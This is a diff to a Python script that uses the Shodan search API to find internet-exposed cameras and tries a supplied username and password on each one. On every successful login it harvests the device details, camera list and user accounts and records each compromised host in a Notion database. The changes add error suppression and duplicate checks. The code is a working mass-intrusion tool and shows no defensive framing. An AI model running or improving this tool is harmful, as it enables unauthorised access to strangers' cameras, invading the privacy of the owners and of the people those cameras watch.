@@ -136,45 +136,67 @@ def search(shodan_key, query, notion_key, database, username, password):
     matches = []
 
     print(f"Trying out {count['total']} hosts!")
+    print()
 
     with Progress() as progress:
         task = progress.add_task("Please wait...", total=count['total'])
 
         for item in shodan_api.search_cursor(query, minify=True, retries=5):
-            camera = Camera(item["ip_str"], item["port"])
+            try:
+                camera = Camera(item["ip_str"], item["port"])
 
-            if camera.check_creds(username, password):
-                camera.get_device()
-                camera.get_cameras()
-                camera.get_users()
+                if camera.check_creds(username, password):
+                    camera.get_device()
+                    camera.get_cameras()
+                    camera.get_users()
 
-                matches.append(camera)
+                    matches.append(camera)
 
-                print(f"Address: {camera.address}:{camera.port} [italic green]Success! Logged In![/italic green]")
+                    print(f"[italic green]Success! Logged In![/italic green] Address: {camera.address}:{camera.port}")
+                    print(f" - Cameras: {len(camera.cameras)}")
+                    print(f" - Users: {len(camera.users)}")
+                    print("")
+            except:
+                pass
 
             progress.advance(task)
 
+    print("")
     print(f"Search done! Found {len(matches)}/{count['total']} matches!")
+    print("")
 
     table = notion_api.get_collection_view(database)
 
+    saved_cameras = []
+    for item in table.collection.get_rows():
+        saved_cameras.append(item.title)
+
+    added_count = 0
+
     for id, camera in enumerate(matches):
         print("")
-        print(f"{id}.", camera.to_dict())
+        try:
+            if f"{camera.address}:{camera.port}" not in saved_cameras:
+                row = table.collection.add_row()
+                row.name = f"{camera.address}:{camera.port}"
+                row.cameras = len(camera.cameras)
+                row.users = len(camera.users)
+                row.address = f"http://{camera.address}:{camera.port}/"
 
-        if table.collection.get_rows(search=f"{camera.address}:{camera.port}")[0].title != f"{camera.address}:{camera.port}":
-            row = table.collection.add_row()
-            row.name = f"{camera.address}:{camera.port}"
-            row.cameras = len(camera.cameras)
-            row.users = len(camera.users)
-            row.address = f"http://{camera.address}:{camera.port}/"
+                page = notion_api.get_block(row.id)
+                page.children.add_new(CodeBlock, title=json.dumps(camera.to_dict(), indent=4, sort_keys=True), language="JSON")
 
-            page = notion_api.get_block(row.id)
-            page.children.add_new(CodeBlock, title=json.dumps(camera.to_dict(), indent=4, sort_keys=True))
+                print(f"{id}. [italic green]Success! Added to database...[/italic green]")
+                added_count += 1
+            else:
+                print(f"{id}. [italic red]Already added to database...[/italic red]")
 
-            print("[italic green]Success! Added to database...[/italic green]")
-        else:
-            print("[italic red]Already added to database...[/italic red]")
+            print(camera.to_dict())
+        except:
+            pass
+
+    print("")
+    print(f"Synchronized! Added {added_count} entries from {len(matches)} matches.")
 
 
 if __name__ == "__main__":
